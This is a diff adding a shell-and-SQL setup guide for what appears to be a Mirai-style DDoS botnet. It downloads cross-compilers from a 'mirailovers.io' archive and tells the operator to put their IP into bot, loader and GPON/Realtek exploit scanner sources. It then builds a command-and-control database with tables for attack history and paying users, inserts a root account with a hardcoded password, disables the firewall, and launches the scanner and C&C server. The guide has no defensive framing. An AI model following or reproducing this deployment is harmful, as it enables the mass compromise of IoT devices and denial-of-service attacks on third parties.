@@ -1,0 +1,181 @@
+# Update system and install required packages
+yum update -y
+yum install epel-release -y
+yum groupinstall "Development Tools" -y
+yum install gmp-devel -y
+ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+
+# Install Go
+cd /tmp
+wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
+sha256sum go1.13.linux-amd64.tar.gz
+sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz
+
+# Set up environment variables
+export PATH=$PATH:/usr/local/go/bin
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+
+# Create project structure and initialize module
+mkdir -p "$GOPATH/src/your_project"
+cd "$GOPATH/src/your_project"
+go mod init your_project
+
+# Install dependencies
+export GO111MODULE=on
+go get filippo.io/edwards25519@v1.0.0
+go get github.com/go-sql-driver/mysql@v1.4.1
+go get github.com/mattn/go-shellwords
+
+# Save environment variables to .bash_profile
+echo 'export GOROOT=/usr/local/go' >> ~/.bash_profile
+echo 'export GOPATH=$HOME/Projects/Proj1' >> ~/.bash_profile
+echo 'export PATH=$GOPATH/bin:$GOROOT/bin:$PATH' >> ~/.bash_profile
+
+source ~/.bash_profile
+go version
+go env
+cd ~/
+
+# IMPORTANT: Go to the project and change the Go file from your project to CNC
+
+# Install cross-compilers
+mkdir /etc/xcompile
+cd /etc/xcompile
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i586.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i686.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-m68k.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sh4.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sparc.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4l.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv5l.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv6l.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv7l.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc-440fp.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-x86_64.tar.bz2
+wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i486.tar.gz
+
+tar -xf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
+tar -xf cross-compiler-i486.tar.gz
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-i686.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-powerpc.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+tar -jxf cross-compiler-x86_64.tar.bz2
+rm -rf *.tar.bz2*
+rm -rf *.tar.gz*
+mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
+mv cross-compiler-i486 i486
+mv cross-compiler-i586 i586
+mv cross-compiler-i686 i686
+mv cross-compiler-m68k m68k
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-sparc sparc
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+mv cross-compiler-x86_64 x86_64
+
+# Change IP (find 0.0.0.0 and replace with your IP)
+# Files to modify:
+scanListen.go
+loader/src/main.c
+loader/src/header/config.h
+dlr/main.c (Replace dots in IP with commas)
+cnc/main.go
+bot/gpon80_scanner.c
+bot/gpon8080_scanner.c
+bot/includes.h
+bot/realtek.c
+
+# Database setup
+yum install mariadb-server -y
+service mariadb restart
+
+# Change MySQL password
+mysql_secure_installation
+
+# Login to MySQL with password
+mysql -u root -pKefistohero3_
+
+# Create database
+CREATE DATABASE shitnet;
+use shitnet;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+INSERT INTO users VALUES (NULL, 'root', 'xbM3RsUNnykLRJnHyxkeuwZAYBxyfCN6)', 0, 0, 0, 0, -1, 1, 30, '');
+exit;
+
+# Restart and disable services
+service iptables stop 
+service httpd restart  
+service mariadb restart
+
+# Compile bot and run CNC server
+cd ~/
+chmod 777 *
+sh build.sh
+
+nano /usr/include/bits/typesizes.h
+# Scroll down and change 1024 to 999999
+# Save the file
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+# Run scanListen
+cd loader
+screen ./scanListen
+
+cd ~/
+screen ./cnc
+
+# C&C Port: 22
